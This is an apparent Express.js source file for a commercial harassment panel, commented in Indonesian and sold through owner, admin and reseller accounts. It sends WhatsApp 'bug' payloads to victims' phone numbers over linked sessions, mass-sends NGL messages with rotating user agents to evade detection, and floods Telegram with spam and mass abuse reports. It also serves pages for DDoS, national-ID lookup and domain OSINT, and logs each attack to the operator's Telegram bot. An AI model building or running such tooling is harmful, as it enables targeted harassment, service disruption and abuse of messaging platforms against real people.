    // Jika justExecuted=true, tampilkan halaman sukses
    if (justExecuted && targetNumber && mode) {
      const cleanTarget = targetNumber.replace(/\D/g, '');
      const country = getCountryCode ? getCountryCode(cleanTarget) : "Unknown";
      
      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed - ${country}`,
        profile: { username, role, expiredDate }
      }, false, currentUser, "", mode));
    }

    console.log(`[INFO] User ${username} (${role}) access execution with ${activeUserSenders.length} senders`);

    // Tampilkan halaman execution normal
    return res.send(executionPage("🟥 Ready", {
      message: activeUserSenders.length > 0 ? "Masukkan nomor target dan pilih mode bug" : "Tidak ada sender aktif. Silakan hubungkan sender terlebih dahulu.",
      activeSenders: activeUserSenders,
      profile: { username, role, expiredDate }
    }, true, currentUser, "", mode));

  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

// INI BUAT PANGILAN KE FUNGSINYA

app.post("/execution", requireAuth, async (req, res) => {
    try {
        // 1. Ambil data dari Session Cookie dan Body Request
        const username = req.cookies.sessionUser;
        const { target, mode, vipMode } = req.body; 

        // 2. Validasi Input Dasar
        if (!target || !mode) {
            return res.status(400).json({ 
                success: false, 
                error: "Nomor target dan jenis bug wajib diisi!" 
            });
        }

        // 3. Bersihkan Nomor (Hanya angka)
        const cleanTarget = target.replace(/\D/g, '');
        if (cleanTarget.startsWith('0')) {
            return res.status(400).json({ 
                success: false, 
                error: "Gunakan kode negara (62), jangan diawali angka 0!" 
            });
        }

        // 4. Ambil Data User & Cek Role
        const users = getUsers(); // Fungsi mengambil data user Anda
        const currentUser = users.find(u => u.username === username);
        const userRole = currentUser ? currentUser.role : 'user';

        // 5. Logika Pemilihan Sender (WhatsApp Session)
        const userSessData = loadUserSessions(); 
        let senderToUse = null;

        // Cek jika Admin/Owner mengaktifkan Mode VIP
        if ((userRole === 'admin' || userRole === 'owner') && vipMode === true) {
            const allUsernames = Object.keys(userSessData);
            const staffUsernames = allUsernames.filter(name => name.startsWith('staff_'));
            
            let allStaffSenders = [];
            staffUsernames.forEach(sName => {
                allStaffSenders = allStaffSenders.concat(userSessData[sName]);
            });

            // Filter sender staff yang sedang online di Map 'sessions'
            const activeStaffSenders = allStaffSenders.filter(s => sessions.has(s));
            
            if (activeStaffSenders.length > 0) {
                senderToUse = activeStaffSenders[0]; // Ambil sender staff pertama yang online
            } else {
                return res.status(400).json({ 
                    success: false, 
                    error: "Tidak ada sender STAFF yang aktif saat ini!" 
                });
            }
        } else {
            // Gunakan session milik user sendiri
            const userSenders = userSessData[username] || [];
            const activeSenders = userSenders.filter(s => sessions.has(s));

            if (activeSenders.length === 0) {
                return res.status(400).json({ 
                    success: false, 
                    error: "WhatsApp Anda tidak terhubung! Silakan hubungkan di menu My Senders." 
                });
            }
            senderToUse = activeSenders[0];
        }

        // 6. Ambil Object Action dari function-config.js
        const selectedAction = actions[mode];
        if (!selectedAction) {
            return res.status(400).json({ 
                success: false, 
                error: "Jenis bug tidak valid dalam sistem!" 
            });
        }

        // 7. Ambil Instance Socket WhatsApp (Baileys)
        const sock = sessions.get(senderToUse);
        if (!sock) {
            return res.status(500).json({ success: false, error: "Gagal mengambil koneksi WhatsApp!" });
        }

        const targetJid = `${cleanTarget}@s.whatsapp.net`;

        // 8. Eksekusi Pengiriman (Async background)
        // Kita tidak memakai 'await' di sini agar user langsung dapat respon di web
        selectedAction.execute(sock, targetJid)
            .then(() => {
                console.log(`[SUCCESS] ${selectedAction.name} sent to ${cleanTarget} by ${username}`);
            })
            .catch(e => {
                console.log(`[EXEC_ERR] User: ${username} | Msg: ${e.message}`);
            });

        // 9. Kirim Log ke Telegram
        const logMessage = `<blockquote>⚡ <b>BUG EXECUTED</b>\n\n👤 <b>User:</b> ${username} (${userRole})\n🎯 <b>Target:</b> ${cleanTarget}\n📱 <b>Mode:</b> ${selectedAction.name}\n🤖 <b>Sender:</b> ${senderToUse} ${vipMode ? '<b>(STAFF)</b>' : '(PERSONAL)'}</blockquote>`;
        
        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID, 
            text: logMessage, 
            parse_mode: "HTML"
        }).catch(() => { /* Silent error jika bot telegram bermasalah */ });

        // 10. Berikan Respon ke Frontend
        res.json({ 
            success: true, 
            message: `Payload ${selectedAction.name} berhasil dikirim ke ${cleanTarget}`,
            target: cleanTarget
        });

    } catch (error) {
        console.error("Internal API Error:", error);
        res.status(500).json({ 
            success: false, 
            error: "Terjadi kesalahan pada server (Internal Server Error)" 
        });
    }
});

// API endpoint untuk spam Telegram
app.post('/api/telegram-spam', async (req, res) => {
    try {
        const username = req.cookies.sessionUser;
        if (!username) {
            return res.json({ success: false, error: 'Unauthorized' });
        }

        const { token, chatId, count, delay, mode } = req.body;
        
        if (!token || !chatId || !count || !delay || !mode) {
            return res.json({ success: false, error: 'Missing parameters' });
        }

        // Validasi input
        if (count > 1000) {
            return res.json({ success: false, error: 'Maximum count is 1000' });
        }

        if (delay < 100) {
            return res.json({ success: false, error: 'Minimum delay is 100ms' });
        }

        // Protected targets - tidak boleh diserang
        const protectedTargets = ['@DannzzNew', '7250235697'];
        if (protectedTargets.includes(chatId)) {
            return res.json({ success: false, error: 'Protected target cannot be attacked' });
        }

        // Kirim log ke Telegram owner
        const logMessage = `<blockquote>🔰 <b>New Telegram Spam Attack</b>
        
👤 User: ${username}
🎯 Target: ${chatId}
📱 Mode: ${mode.toUpperCase()}
🔢 Count: ${count}
⏰ Delay: ${delay}ms
🕐 Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: logMessage,
                parse_mode: "HTML"
            });
        } catch (err) {
            console.error("Gagal kirim log Telegram:", err.message);
        }

        // Return success untuk trigger frontend
        res.json({ 
            success: true, 
            message: 'Attack started successfully',
            attackId: Date.now().toString()
        });

    } catch (error) {
        console.error('Telegram spam error:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// ============================================
const userTracking = {
  requests: new Map(), // Track per user
  targets: new Map(),  // Track per target
  
  // Reset otomatis tiap 24 jam
  resetDaily() {
    this.requests.clear();
    this.targets.clear();
    console.log('🔄 Daily tracking reset');
  },
  
  // Cek apakah user sudah melebihi limit harian
  canUserSend(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    return current + count;
  },
  
  // Cek apakah target sudah melebihi limit harian
  canTargetReceive(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    return current + count;
  },
  
  // Update counter setelah berhasil kirim
  updateUser(userId, count) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    const current = this.requests.get(key) || 0;
    this.requests.set(key, current + count);
  },
  
  updateTarget(target, count) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    const current = this.targets.get(key) || 0;
    this.targets.set(key, current + count);
  },
  
  // Lihat statistik user
  getUserStats(userId) {
    const today = new Date().toDateString();
    const key = `${userId}-${today}`;
    return this.requests.get(key) || 0;
  },
  
  // Lihat statistik target
  getTargetStats(target) {
    const today = new Date().toDateString();
    const key = `${target}-${today}`;
    return this.targets.get(key) || 0;
  }
};

// Auto-reset setiap 24 jam (midnight)
setInterval(() => {
  const now = new Date();
  if (now.getHours() === 0 && now.getMinutes() === 0) {
    userTracking.resetDaily();
  }
}, 60000); // Cek tiap 1 menit

// ============================================
// FUNGSI NGL SPAM - UPDATED
// ============================================
async function nglSpam(target, message, count) {
  const logs = [];
  let success = 0;
  let errors = 0;

  console.log(`🔍 Starting NGL spam to ${target}, message: ${message}, count: ${count}`);

  const sendNGLMessage = async (target, message, attempt) => {
    // Enhanced form data dengan field tambahan
    const formData = new URLSearchParams();
    formData.append('username', target);
    formData.append('question', message);
    formData.append('deviceId', generateEnhancedUUID());
    formData.append('gameSlug', '');
    formData.append('referrer', '');
    formData.append('timestamp', Date.now().toString());

    // Random delay yang lebih realistis
    if (attempt > 1) {
      const randomDelay = Math.floor(Math.random() * 4000) + 2000; // 2-6 detik
      await new Promise(resolve => setTimeout(resolve, randomDelay));
    }

    // Enhanced user agents
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
    ];
    
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    try {
      console.log(`🔍 Attempt ${attempt} to ${target}`);
      
      const response = await axios.post('https://ngl.link/api/submit', formData, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'User-Agent': randomUserAgent,
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9',
          'Origin': 'https://ngl.link',
          'Referer': `https://ngl.link/${target}`,
          'X-Requested-With': 'XMLHttpRequest',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin'
        },
        timeout: 15000,
        validateStatus: function (status) {
          return status >= 200 && status < 500; // Terima semua status kecuali server errors
        }
      });

      console.log(`🔍 Response status: ${response.status}, data:`, response.data);

      // Enhanced response handling
      if (response.status === 200) {
        if (response.data && response.data.success !== false) {
          success++;
          logs.push(`[${attempt}/${count}] ✅ Berhasil dikirim ke ${target}`);
          return true;
        } else {
          errors++;
          logs.push(`[${attempt}/${count}] ⚠️ Response tidak valid: ${JSON.stringify(response.data)}`);
          return false;
        }
      } else if (response.status === 429) {
        errors++;
        logs.push(`[${attempt}/${count}] 🚫 Rate limited - tunggu beberapa saat`);
        // Tunggu lebih lama jika rate limited
        await new Promise(resolve => setTimeout(resolve, 10000));
        return false;
      } else {
        errors++;
        logs.push(`[${attempt}/${count}] ❌ HTTP ${response.status}: ${response.statusText}`);
        return false;
      }
    } catch (error) {
      errors++;
      console.error(`🔍 Error in attempt ${attempt}:`, error.message);
      
      if (error.response) {
        logs.push(`[${attempt}/${count}] ❌ HTTP ${error.response.status}: ${error.response.data?.message || error.response.statusText}`);
      } else if (error.request) {
        logs.push(`[${attempt}/${count}] ❌ Network Error: Tidak dapat terhubung ke server NGL`);
      } else {
        logs.push(`[${attempt}/${count}] ❌ Error: ${error.message}`);
      }
      
      return false;
    }
  };

  // Enhanced UUID generator
  function generateEnhancedUUID() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substr(2, 9);
    return `web-${timestamp}-${random}`;
  }

  // Validasi input
  if (!target || !message || count <= 0) {
    throw new Error('Input tidak valid');
  }

  if (count > 50) { // Kurangi limit untuk menghindari detection
    throw new Error('Maksimal 50 pesan per request untuk menghindari detection');
  }

  // Jalankan spam
  logs.push(`🚀 Memulai spam ke: ${target}`);
  logs.push(`📝 Pesan: ${message}`);
  logs.push(`🔢 Jumlah: ${count} pesan`);
  logs.push(`⏳ Delay: 2-6 detik random antar pesan`);
  logs.push(`─`.repeat(40));

  for (let i = 0; i < count; i++) {
    const result = await sendNGLMessage(target, message, i + 1);
    
    // Jika rate limited, berhenti sementara
    if (i > 0 && i % 10 === 0) {
      logs.push(`⏸️  Istirahat sebentar setelah ${i} pesan...`);
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }

  logs.push(`─`.repeat(40));
  logs.push(`📊 SELESAI! Sukses: ${success}, Gagal: ${errors}`);

  return { success, errors, logs };
}

// Helper function untuk generate UUID
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// ============================================
// ROUTE NGL SPAM WEB - UPDATED dengan Info Limit
// ============================================

// ==================== NGL SPAM ROUTE ==================== //
app.get("/ngl", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  // Load template dari file terpisah
  const filePath = path.join(__dirname, "tools", "spam-ngl.html");
  
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    // Replace variables dengan data REAL dari sistem
    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);
    
    res.send(finalHtml);
  });
});

// ============================================
// API ENDPOINT - UPDATED dengan Tracking System
// ============================================
app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

// ✨ BONUS: Endpoint untuk cek target
app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;
  
  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

// API Endpoint untuk memproses spam laporan
app.post('/api/execute-report', async (req, res) => {
    const { targetId, reason, count } = req.body;
    
    if (!targetId || !count) {
        return res.status(400).json({ success: false, message: 'Parameter tidak lengkap' });
    }

    const reportCount = parseInt(count) > 100 ? 100 : parseInt(count);
    let successCount = 0;

    try {
        const url = `https://api.telegram.org/bot${config.token}/reportChat`;
        
        // Loop pengiriman sesuai jumlah spam yang diminta
        for (let i = 0; i < reportCount; i++) {
            await axios.post(url, {
                chat_id: targetId,
                reason: reason || 'spam'
            }).catch(e => console.log("Rate limit hit or error on packet " + i));
            successCount++;
        }

        res.json({ 
            success: true, 
            message: `${successCount} laporan berhasil dikirim ke ${targetId}` 
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // ✅ VALIDASI 1: Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // ✅ VALIDASI 2: Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // ✅ VALIDASI 3: Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // ✅ UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Route untuk TikTok (HANYA bisa diakses setelah login)
app.get("/tiktok", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "tools", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/ddos", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "tools", "ddosl4.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/report", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "tools", "report.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/nik", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "tools", "nikparse.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/domain", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "tools", "domain-osint.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

// Route untuk halaman My Senders
app.get("/my-senders", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "XAVIRE INVICTUS", "sender.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file sender.html:", err);
      return res.status(500).send("File sender.html tidak ditemukan");
    }
    res.send(html);
  });
});

// API untuk mendapatkan daftar sender user
app.get("/api/my-senders", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const userSessions = loadUserSessions();
  const userSenders = userSessions[username] || [];
  
  res.json({ 
    success: true, 
    senders: userSenders,
    total: userSenders.length
  });
});

// SSE endpoint untuk events real-time
app.get("/api/events", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*',
  });

  // Simpan response object untuk user ini
  userEvents.set(username, res);

  // Kirim heartbeat setiap 30 detik
  const heartbeat = setInterval(() => {
    try {
      res.write(': heartbeat\n\n');
    } catch (err) {
      clearInterval(heartbeat);
    }
  }, 30000);

  // Cleanup saat connection close
  req.on('close', () => {
    clearInterval(heartbeat);
    userEvents.delete(username);
  });

  // Kirim event connection established
  res.write(`data: ${JSON.stringify({ type: 'connected', message: 'Event stream connected' })}\n\n`);
});

// API untuk menambah sender baru
app.post("/api/add-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  // Validasi nomor
  const cleanNumber = number.replace(/\D/g, '');
  if (!cleanNumber.startsWith('')) {
    return res.json({ success: false, error: "Nomor harus diawali dengan 62" });
  }
  
  if (cleanNumber.length < 10) {
    return res.json({ success: false, error: "Nomor terlalu pendek" });
  }
  
  try {
    console.log(`[API] User ${username} adding sender: ${cleanNumber}`);
    const sessionDir = userSessionPath(username, cleanNumber);
    
    // Langsung jalankan koneksi di background
    connectToWhatsAppUser(username, cleanNumber, sessionDir)
      .then((sock) => {
        console.log(`[${username}] ✅ Sender ${cleanNumber} connected successfully`);
        // Simpan socket ke map jika diperlukan
      })
      .catch((error) => {
        console.error(`[${username}] ❌ Failed to connect sender ${cleanNumber}:`, error.message);
      });

    res.json({ 
      success: true, 
      message: "Proses koneksi dimulai! Silakan tunggu notifikasi kode pairing.",
      number: cleanNumber,
      note: "Kode pairing akan muncul di halaman ini dalam beberapa detik..."
    });
    
  } catch (error) {
    console.error(`[API] Error adding sender for ${username}:`, error);
    res.json({ 
      success: false, 
      error: "Terjadi error saat memproses sender: " + error.message 
    });
  }
});

// API untuk menghapus sender
app.post("/api/delete-sender", requireAuth, async (req, res) => {
  const username = req.cookies.sessionUser;
  const { number } = req.body;
  
  if (!number) {
    return res.json({ success: false, error: "Nomor tidak boleh kosong" });
  }
  
  try {
    const userSessions = loadUserSessions();
    if (userSessions[username]) {
      userSessions[username] = userSessions[username].filter(n => n !== number);
      saveUserSessions(userSessions);
    }
    
    // Hapus folder session
    const sessionDir = userSessionPath(username, number);
    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    }
    
    res.json({ 
      success: true, 
      message: "Sender berhasil dihapus",
      number: number
    });
  } catch (error) {
    res.json({ 
      success: false, 
      error: error.message 
    });
  }
});

// ============= User Add ================== \\
// GANTI kode route /adduser yang ada dengan yang ini:
app.post("/adduser", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const users = getUsers();
    const currentUser = users.find(u => u.username === username);
    
    if (!currentUser) {
      return res.redirect("/login?msg=User tidak ditemukan");
    }

    const sessionRole = currentUser.role || 'user';
    const { username: newUsername, password, role, durasi } = req.body;

    // Validasi input lengkap
    if (!newUsername || !password || !role || !durasi) {
      return res.send(`
        <script>
          alert("❌ Lengkapi semua kolom.");
          window.history.back();
        </script>
      `);
    }

    // Validasi durasi
    const durasiNumber = parseInt(durasi);
    if (isNaN(durasiNumber) || durasiNumber <= 0) {
      return res.send(`
        <script>
          alert("❌ Durasi harus angka positif.");
          window.history.back();
        </script>
      `);
    }

    // Cek hak akses berdasarkan role pembuat
    if (sessionRole === "user") {
      return res.send(`
        <script>
          alert("🚫 User tidak bisa membuat akun.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role !== "user") {
      return res.send(`
        <script>
          alert("🚫 Reseller hanya boleh membuat user biasa.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "admin") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat admin lain.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "admin" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Admin tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    if (sessionRole === "reseller" && role === "owner") {
      return res.send(`
        <script>
          alert("🚫 Reseller tidak boleh membuat owner.");
          window.history.back();
        </script>
      `);
    }

    // Cek username sudah ada
    if (users.some(u => u.username === newUsername)) {
      return res.send(`
        <script>
          alert("❌ Username '${newUsername}' sudah terdaftar.");
          window.history.back();
        </script>
      `);
    }

    // Validasi panjang username dan password
    if (newUsername.length < 3) {
      return res.send(`
        <script>
          alert("❌ Username minimal 3 karakter.");
          window.history.back();
        </script>
      `);
    }

    if (password.length < 4) {
      return res.send(`
        <script>
          alert("❌ Password minimal 4 karakter.");
          window.history.back();
        </script>
      `);
    }

    const expired = Date.now() + (durasiNumber * 86400000);

    // Buat user baru
    const newUser = {
      username: newUsername,
      key: password,
      expired,
      role,
      telegram_id: "",
      isLoggedIn: false
    };

    users.push(newUser);
    
    // Simpan dan cek hasilnya
    const saveResult = saveUsers(users);
    
    if (!saveResult) {
      throw new Error("Gagal menyimpan data user ke file system");
    }

    // Redirect ke userlist dengan pesan sukses
    return res.redirect("/userlist?msg=User " + newUsername + " berhasil dibuat");

  } catch (error) {
    console.error("❌ Error in /adduser:", error);
    return res.send(`
      <script>
        alert("❌ Terjadi error saat menambahkan user: ${error.message}");
        window.history.back();
      </script>
    `);
  }
});

// untuk ubah pw akun

// Contoh middleware session (sesuaikan dengan yang Anda pakai, misal: express-session)
app.get('/edit-key', (req, res) => {
    // 1. Cek apakah session ada. Jika tidak, arahkan ke login.
    // Ini penting agar 'username' tidak menjadi "Guest" yang tidak ada di user.json
    if (!req.session?.username) {
        return res.redirect('/login?msg=Silakan login terlebih dahulu');
    }

    const username = req.session.username;
    const role = req.session.role || "user"; 

    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Change Password - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root {
            --primary: #32CD32; 
            --secondary: #228B22; 
            --accent: #adff2f; 
            --bg-dark: #050505;
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-dark);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(50, 205, 50, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(173, 255, 47, 0.05) 0%, transparent 40%);
        }

        #particles { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0; opacity: 0.4; }
        .content { position: relative; z-index: 2; width: 100%; max-width: 450px; padding: 20px; }

        .header { text-align: center; margin-bottom: 30px; }
        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 3px;
            margin-bottom: 5px;
        }

        .form-container {
            background: rgba(15, 15, 15, 0.8);
            border: 1px solid var(--glass-border);
            padding: 35px;
            border-radius: 25px;
            backdrop-filter: blur(15px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
            border-top: 2px solid var(--primary);
        }

        .role-display {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            margin-bottom: 15px;
            letter-spacing: 1px;
            background: ${
                role === 'owner' ? 'linear-gradient(45deg, #FFD700, #FFA500)' :
                role === 'admin' ? 'linear-gradient(45deg, #FF4B2B, #FF416C)' :
                'linear-gradient(45deg, #32CD32, #228B22)'
            };
            color: ${role === 'owner' ? '#000' : '#fff'};
            box-shadow: 0 0 15px ${role === 'owner' ? '#FFD70044' : '#32CD3244'};
        }

        .form-group { margin-bottom: 22px; }
        label { display: block; margin-bottom: 10px; font-size: 11px; color: #888; letter-spacing: 1px; font-weight: 600; }
        label i { color: var(--primary); margin-right: 8px; }

        input {
            width: 100%;
            padding: 14px 18px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.08);
            background: rgba(255,255,255,0.03);
            color: #fff;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        input:focus { 
            border-color: var(--primary); 
            background: rgba(50, 205, 50, 0.05);
            box-shadow: 0 0 15px rgba(50, 205, 50, 0.1);
        }

        .btn-update {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: #fff;
            font-family: 'Orbitron', sans-serif;
            font-size: 13px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.4s;
            margin-top: 10px;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-update:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 10px 25px rgba(50, 205, 50, 0.4);
            filter: brightness(1.1);
        }

        .back-link {
            display: block;
            text-align: center;
            margin-top: 25px;
            color: #555;
            text-decoration: none;
            font-size: 11px;
            font-family: 'Orbitron', sans-serif;
            transition: 0.3s;
        }
